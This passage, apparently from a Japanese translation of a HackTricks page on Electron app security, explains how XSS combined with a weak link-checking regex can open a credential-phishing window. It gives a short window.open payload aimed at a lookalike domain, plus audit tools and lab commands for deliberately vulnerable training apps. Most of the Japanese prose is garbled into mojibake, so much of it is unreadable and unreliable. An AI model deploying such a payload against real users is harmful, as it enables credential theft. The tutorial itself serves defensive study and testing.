ã¾ãšã€æ–°ã—ã„URLã‚’é–‹ã“ã†ã¨ã—ãŸã¨ãã«ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’ã€ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã®JSã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
```markdown
**`openInternally`** é–¢æ•°ã®å‘¼ã³å‡ºã—ã¯ã€**ãƒªãƒ³ã‚¯**ãŒãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«å±ã™ã‚‹ãƒªãƒ³ã‚¯ã§ã‚ã‚‹å ´åˆã«ã¯**ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦**ã§**é–‹ã‹ã‚Œã‚‹**ã‹ã€**ã¾ãŸã¯** **ãƒ–ãƒ©ã‚¦ã‚¶ã§ç¬¬ä¸‰è€…ãƒªã‚½ãƒ¼ã‚¹ã¨ã—ã¦é–‹ã‹ã‚Œã‚‹**ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚

é–¢æ•°ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹ **regex** ãŒ**ãƒã‚¤ãƒ‘ã‚¹ã«å¯¾ã—ã¦è„†å¼±**ã§ã‚ã‚‹å ´åˆï¼ˆä¾‹ãˆã°ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ‰ãƒƒãƒˆã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ã¦ã„ãªã„å ´åˆãªã©ï¼‰ã€æ”»æ’ƒè€…ã¯XSSã‚’æ‚ªç”¨ã—ã¦**æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ã**ã“ã¨ãŒã§ãã€ãã‚Œã¯æ”»æ’ƒè€…ã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã«ä½ç½®ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**èªè¨¼æƒ…å ±ã®å…¥åŠ›ã‚’æ±‚ã‚ã¾ã™**ï¼š
```
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **ãƒ„ãƒ¼ãƒ«**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) ã¯ã€Electronãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹èª¤è¨­å®šã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ãƒ³ãƒãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ã¯ã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç”¨ã®ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹VS Codeãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã§ã€Electronegativityã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ã¯ã€è„†å¼±ãªã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚
* [**Electro.ng**](https://electro.ng/): è³¼å…¥ãŒå¿…è¦ã§ã™ã€‚

## ãƒ©ãƒœ

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) ã§ã¯ã€è„†å¼±ãªElectronã‚¢ãƒ—ãƒªã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ©ãƒœã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ©ãƒœã‚’é€²ã‚ã‚‹ã®ã«å½¹ç«‹ã¤ã„ãã¤ã‹ã®ã‚³ãƒãƒ³ãƒ‰ãŒã‚ã‚Šã¾ã™ï¼š
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒæ–‡çŒ®**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Electronã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹ã•ã‚‰ãªã‚‹ç ”ç©¶ã¨ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—ã¯[https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)ã§ç¢ºèªã§ãã¾ã™ã€‚
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><strong>AWSã®ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
